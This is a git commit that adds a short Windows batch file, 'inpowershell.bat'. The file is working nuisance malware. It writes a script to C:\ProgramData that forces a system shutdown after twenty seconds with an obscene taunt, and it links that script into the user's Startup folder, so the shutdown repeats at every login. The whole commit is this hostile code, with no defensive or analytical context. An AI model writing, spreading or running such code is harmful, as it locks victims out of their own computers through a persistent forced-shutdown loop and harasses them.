a0dfc740579ec432792a694976dd95d8563bcad4
goonbagscoundrel <112592524+goonbagscoundrel@users.noreply.github.com>
2022-09-01 09:26:59 +1000

    Create inpowershell.bat

---
+++ inpowershell.bat
@@ -0,0 +1,3 @@
+echo @echo off >> C:\ProgramData\rest.bat
+echo shutdown.exe /s /t 20 /c "Suck a dick, dumb shit! :)" >> C:\ProgramData\rest.bat
+cmd /c mklink "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\rest.bat.lnk" "C:\ProgramData\rest.bat"
